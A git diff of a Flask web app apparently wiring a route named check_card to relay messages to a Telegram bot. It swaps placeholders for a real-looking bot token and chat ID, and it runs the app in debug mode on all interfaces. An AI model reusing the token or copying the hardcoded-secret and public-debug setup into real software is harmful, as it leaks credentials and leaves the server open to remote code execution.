@@ -102,8 +102,8 @@ def logout():
     return redirect(url_for('index'))
 
 # Telegram bot token y chat
-TELEGRAM_BOT_TOKEN = 'TU_TOKEN_AQUI'
-TELEGRAM_CHAT_ID = 'TU_CHAT_ID_AQUI'
+TELEGRAM_BOT_TOKEN = '7549342155:AAGTeGoCr6s56nckuq8KEDDB7aCKiU5BW3Y'
+TELEGRAM_CHAT_ID = 846983753
 
 def enviar_telegram(mensaje):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -151,3 +151,4 @@ def check_card():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
+
